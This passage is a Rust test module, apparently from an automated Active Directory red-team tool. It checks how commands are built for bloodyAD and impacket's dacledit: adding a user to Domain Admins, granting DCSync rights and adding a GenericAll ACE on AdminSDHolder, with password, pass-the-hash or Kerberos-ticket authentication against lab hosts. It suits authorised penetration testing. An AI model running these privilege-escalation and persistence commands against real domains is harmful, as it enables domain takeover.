            "0123456789abcdef0123456789abcdefa",
            "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
            "nolm:0123456789abcdef0123456789abcde",
            "0123456789abcdef0123456789abcdef:short",
        ] {
            let Err(err) = super::build_bloodyad_add_group_member(&with_arg(&base, "hash", raw))
            else {
                panic!("malformed hash {raw:?} must not reach the subprocess");
            };
            assert!(
                err.to_string().contains("malformed NTLM hash"),
                "expected a malformed-hash error for {raw:?}, got: {err}"
            );
        }
    }

    #[test]
    fn bloodyad_auth_precedence_is_ticket_then_hash_then_password() {
        let base = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "group": "Domain Admins",
            "target_user": "bob"
        });

        let all_three = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "group": "Domain Admins",
            "target_user": "bob",
            "password": "P@ssw0rd!",   // pragma: allowlist secret
            "hash": NT,
            "ticket_path": "/tmp/ares-tickets/alice.ccache"
        });
        let cmd = super::build_bloodyad_add_group_member(&all_three).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv
            .iter()
            .any(|a| a == "ccache=/tmp/ares-tickets/alice.ccache"));
        assert!(
            argv.iter().all(|a| a != "-p"),
            "ticket_path must suppress both -p forms; got {argv:?}"
        );

        let hash_and_password = with_arg(&with_arg(&base, "hash", NT), "password", "P@ssw0rd!");
        let cmd = super::build_bloodyad_add_group_member(&hash_and_password).unwrap();
        assert_eq!(
            flag_value(cmd.args_for_test(), "-p"),
            Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str()),
            "hash must win over password"
        );

        let cmd = super::build_bloodyad_add_group_member(&with_arg(&base, "password", "P@ssw0rd!"))
            .unwrap();
        assert_eq!(flag_value(cmd.args_for_test(), "-p"), Some("P@ssw0rd!"));
    }

    #[test]
    fn bloodyad_empty_hash_falls_back_to_password() {
        let base = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "group": "Domain Admins",
            "target_user": "bob",
            "password": "P@ssw0rd!"   // pragma: allowlist secret
        });
        let cmd = super::build_bloodyad_add_group_member(&with_arg(&base, "hash", "")).unwrap();
        assert_eq!(flag_value(cmd.args_for_test(), "-p"), Some("P@ssw0rd!"));
    }

    #[test]
    fn bloodyad_family_accepts_hash_only_auth() {
        for (name, base, build) in bloodyad_tool_cases() {
            let cmd = build(&with_arg(&base, "hash", NT))
                .unwrap_or_else(|e| panic!("{name} must build from a hash alone: {e}"));
            let argv = cmd.args_for_test();
            assert_eq!(
                flag_value(argv, "-p"),
                Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str()),
                "{name} must pass the hash through bloodyAD's -p flag"
            );
            assert_eq!(flag_value(argv, "-u"), Some("alice"), "{name}");
        }
    }

    #[test]
    fn bloodyad_family_accepts_ticket_only_auth() {
        for (name, base, build) in bloodyad_tool_cases() {
            let args = with_arg(&base, "ticket_path", "/tmp/ares-tickets/alice.ccache");
            let cmd = build(&args)
                .unwrap_or_else(|e| panic!("{name} must build from a ccache alone: {e}"));
            let argv = cmd.args_for_test();
            assert!(argv.iter().any(|a| a == "-k"), "{name} missing -k");
            assert!(
                argv.iter()
                    .any(|a| a == "ccache=/tmp/ares-tickets/alice.ccache"),
                "{name} must use bloodyAD's `-k ccache=<path>` keyword form"
            );
            assert!(
                cmd.env_vars_for_test()
                    .iter()
                    .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/alice.ccache"),
                "{name} must export KRB5CCNAME"
            );
        }
    }

    #[test]
    fn bloodyad_family_accepts_password_only_auth() {
        for (name, base, build) in bloodyad_tool_cases() {
            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!"))
                .unwrap_or_else(|e| panic!("{name} must build from a password alone: {e}"));
            let argv = cmd.args_for_test();
            assert_eq!(flag_value(argv, "-p"), Some("P@ssw0rd!"), "{name}");
            assert!(argv.iter().all(|a| a != "-k"), "{name}");
        }
    }

    #[test]
    fn bloodyad_family_without_auth_material_errors() {
        for (name, base, build) in bloodyad_tool_cases() {
            assert!(
                build(&base).is_err(),
                "{name} must refuse to dispatch without any auth material"
            );
        }
    }

    #[test]
    fn bloodyad_missing_auth_error_names_every_accepted_form() {
        let args = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "group": "Domain Admins",
            "target_user": "bob"
        });
        let Err(err) = super::build_bloodyad_add_group_member(&args) else {
            panic!("no auth material must be an error");
        };
        let err = err.to_string();
        for form in ["ticket_path", "hash", "nt_hash", "ntlm_hash", "password"] {
            assert!(
                err.contains(form),
                "error must name the `{form}` auth form; got: {err}"
            );
        }
    }

    #[test]
    fn dacl_edit_hash_uses_impacket_hashes_flag() {
        let args = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "principal": "bob",
            "rights": "DCSync", "target_dn": "DC=contoso,DC=local",
            "hash": NT
        });
        let cmd = super::build_dacl_edit(&args).unwrap();
        let argv = cmd.args_for_test();
        assert_eq!(
            flag_value(argv, "-hashes"),
            Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str())
        );
        assert!(argv.iter().any(|a| a == "-no-pass"));
        assert!(
            argv.iter()
                .any(|a| a == "contoso.local/alice@192.168.58.10"),
            "pass-the-hash target string must carry no password; got {argv:?}"
        );
    }

    #[test]
    fn dacl_edit_ticket_uses_kerberos_flags() {
        let args = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "principal": "bob",
            "rights": "DCSync", "target_dn": "DC=contoso,DC=local",
            "ticket_path": "/tmp/ares-tickets/alice.ccache"
        });
        let cmd = super::build_dacl_edit(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv.iter().any(|a| a == "-k"));
        assert!(argv.iter().any(|a| a == "-no-pass"));
        assert!(argv.iter().all(|a| a != "-hashes"));
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/alice.ccache"));
    }

    #[test]
    fn dacl_edit_password_branch_unchanged() {
        let args = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "principal": "bob",
            "rights": "DCSync", "target_dn": "DC=contoso,DC=local",
            "password": "P@ssw0rd!"   // pragma: allowlist secret
        });
        let cmd = super::build_dacl_edit(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv
            .iter()
            .any(|a| a == "contoso.local/alice:P@ssw0rd!@192.168.58.10"));
        assert!(argv.iter().all(|a| a != "-hashes"));
        assert!(argv.iter().all(|a| a != "-k"));
    }

    #[test]
    fn dacl_edit_without_auth_material_errors() {
        let args = json!({
            "domain": "contoso.local", "username": "alice",
            "dc_ip": "192.168.58.10", "principal": "bob",
            "rights": "DCSync", "target_dn": "DC=contoso,DC=local"
        });
        assert!(super::build_dacl_edit(&args).is_err());
    }

    #[test]
    fn adminsd_holder_hash_auth_keeps_container_dn() {
        let args = json!({
            "domain": "fabrikam.local", "username": "alice",
            "dc_ip": "192.168.58.20", "principal": "bob",
            "hash": format!("{LM}:{NT}")
        });
        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(argv
            .iter()
            .any(|a| a == "CN=AdminSDHolder,CN=System,DC=fabrikam,DC=local"));
        assert_eq!(flag_value(argv, "-p"), Some(format!("{LM}:{NT}").as_str()));
    }

    #[test]
    fn adminsd_holder_uses_a_real_bloodyad_subcommand() {
        let args = json!({
            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10", "principal": "bob"
        });
        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
        let argv = cmd.args_for_test();
        assert!(
            argv.iter().any(|a| a == "genericAll"),
            "must use a valid `bloodyAD add` verb; argv={argv:?}"
        );
        assert!(
            !argv.iter().any(|a| a == "aclEntry"),
            "aclEntry is not a bloodyAD subcommand and always fails; argv={argv:?}"
        );
    }

    #[test]
    fn adminsd_holder_rejects_rights_genericall_cannot_express() {
        let args = json!({
            "domain": "contoso.local", "username": "alice", "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10", "principal": "bob", "right": "WriteDacl"
        });
        assert!(super::build_adminsd_holder_add_ace(&args).is_err());
    }
}
